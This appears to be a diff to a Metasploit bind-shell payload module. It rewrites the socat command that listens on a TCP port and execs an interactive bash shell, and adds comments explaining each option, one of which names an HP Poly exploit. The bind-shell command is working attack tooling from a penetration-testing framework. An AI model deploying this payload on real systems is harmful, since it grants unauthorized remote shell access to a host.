@@ -32,7 +32,7 @@ module MetasploitModule
     register_advanced_options(
       [
         OptString.new('SocatPath', [true, 'The path to the Socat executable', 'socat']),
-        OptString.new('BashPath', [true, 'The path to the Bash executable', 'bash'])
+        OptString.new('BashPath', [true, 'The path to the shell executable', 'bash'])
       ]
     )
   end
@@ -49,6 +49,16 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    "#{datastore['SocatPath']} tcp-l:#{datastore['LPORT']},fork exec:'#{datastore['BashPath']}'"
+    # * We allow a custom socat and bash path be specified as some embedded systems may have them in non-standard locations.
+    # * We use the shorthand tcp-l instead of tcp-listen to save a few characters.
+    # * We do not use fork with tcp-l, so this payload will only handle one connection and is not persistent.
+    # * We exec a shell, but do not pass the -li arguments. This is to avoid a whitespace in the exec string, which for
+    # some exploits (HP Poly CVE-2026-0826) incur an encoding issue that cannot be solved via an encoder like IFS.
+    # * We make the shell an interactive login shell by using the login and pty options for socat.
+    # * We use setsid to make the shell run in a new session, which should ensure stability if the parent dies.
+    # * We use stderr so error message are visible.
+    # * We use sigint to pass ctrl-c to the shell and not kill socat.
+    # * We use sane to try and clean up any terminal character issues and start from a default state.
+    "#{datastore['SocatPath']} tcp-l:#{datastore['LPORT']} exec:'#{datastore['BashPath']}',login,pty,stderr,setsid,sigint,sane"
   end
 end
